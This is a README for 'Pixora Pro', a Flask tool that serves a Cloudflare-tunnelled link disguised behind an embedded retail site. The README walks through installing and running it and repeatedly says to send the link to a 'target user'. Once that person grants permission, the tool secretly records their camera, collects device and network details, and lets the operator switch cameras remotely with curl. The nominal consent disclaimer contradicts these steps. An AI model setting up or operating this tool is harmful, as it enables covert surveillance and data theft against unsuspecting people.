# Pixora Pro - Enhanced Camera Access Tool

Pixora Pro is a Python-based tool that lets you remotely access a device's camera (front/back), record video in chunks, and instantly collect detailed device and network information when a user grants camera/mic permission. It also supports public access using Cloudflare Tunnel.

---

## 📦 1. Prerequisites

- **Python 3.7 or higher**
- **pip** (Python package manager)
- **git** (version control system)
- **cloudflared** (for public link)
- **ffmpeg** (optional, for advanced video handling)

---

## 🚀 2. Installation

### a. Clone the Repository

> If you don’t have git, install it first:  
> `sudo apt update && sudo apt install git -y` (Linux)  
> or download from [git-scm.com](https://git-scm.com/)

```sh
git clone https://github.com/Dharmveer829912/Pixora-pro.git
cd pixora-pro
```

### b. (Optional) Create a Virtual Environment

This keeps dependencies for Pixora separate from other Python projects.

```sh
python3 -m venv venv
source venv/bin/activate        # On Linux/Mac
venv\Scripts\activate           # On Windows
```

### c. Install Python Dependencies

```sh
pip install -r requirements.txt
```

This will install:
- flask
- requests
- pyfiglet
- termcolor
- colorama

### d. Install cloudflared

#### Ubuntu/Debian

```sh
sudo apt install cloudflared
```

#### Other OS / Universal

- Download from [Cloudflare Tunnel Docs](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/)
- Or get the latest release here: https://github.com/cloudflare/cloudflared/releases

#### Check

```sh
cloudflared --version
```

### e. (Optional) Install ffmpeg

```sh
sudo apt install ffmpeg
```

---

## 🏃 3. How to Run

### a. Start the Tool

```sh
python pixora.py
```

You will see a banner and be prompted:

```text
Choose Camera Mode:
1. Front Camera Only
2. Back Camera Only
3. Dynamic Switching (Switch anytime)
Enter your choice (1, 2, or 3):
```

Pick your mode, then enter a website URL to embed (e.g., https://www.flipkart.com/).

### b. Share the Public Link

After a short wait, you’ll see:

```
[CAMERA LINK] https://your-tunnel.trycloudflare.com
```

**Send this link to your target user.**

---

## 🔄 4. How to Switch Camera Remotely

While Pixora Pro is running, in another terminal (or on another computer on the same network):

```sh
curl -X POST http://localhost:8080/set_camera_mode -H 'Content-Type: application/json' -d '{"mode": "front"}'
curl -X POST http://localhost:8080/set_camera_mode -H 'Content-Type: application/json' -d '{"mode": "back"}'
```

> To use with your public link:
>
> ```sh
> curl -X POST https://your-tunnel.trycloudflare.com/set_camera_mode -H 'Content-Type: application/json' -d '{"mode": "front"}'
> ```

---

## 💾 5. Where to Find Data

- **Recorded videos:** in the `static/` folder as `.webm` files.
- **Device/network info:** in `user_data.jsonl` (newline-delimited JSON, one per user session).
- **Instant info print:** Shown in your terminal as soon as the user grants camera/mic permission.

---

## 🔧 6. Troubleshooting and Common Errors

**Q: It says `ModuleNotFoundError`?**  
A: Run `pip install -r requirements.txt` again.

**Q: `cloudflared` not found?**  
A: Install cloudflared as shown above and make sure it's on your PATH.

**Q: Port already in use?**  
A: Edit `pixora.py` and change the port number in `app.run(host='0.0.0.0', port=8080, ...)`.

**Q: Videos not uploading/saving?**  
A: Make sure the browser is granting camera/mic permission and the `static/` folder has write access.

**Q: Nothing shows in terminal after permission?**  
A: Try with Chrome/Firefox (some browsers block background JS). Make sure JavaScript is enabled.

---

## 📄 7. LICENSE

See [LICENSE](LICENSE) (MIT License — free for any use but **at your own risk**).

---

## ❗ 8. Disclaimer

For educational and authorized use only.  
Never use Pixora Pro without explicit user consent.  
The author is **not responsible** for any misuse.

---

## 📝 9. How To Upload/Share On Your GitHub

1. [Create a new repo](https://github.com/new) (e.g., `pixora-pro`)
2. Make sure your code, `requirements.txt`, `README.md`, and `LICENSE` are in the folder.
3. Run:

```sh
git init
git add pixora.py requirements.txt README.md LICENSE
git commit -m "Initial Pixora Pro"
git branch -M main
git remote set-url origin https://github.com/Dharmveer829912/Pixora-pro.git
git push -u origin main
```

---

## 🎉 10. You’re Done!

- Give your link to your target user
- Instantly collect and print device info and record camera video

---

**If you have any issues, open an issue on GitHub or contact [@Dealer_999](https://t.me/Dealer_999) on Telegram.**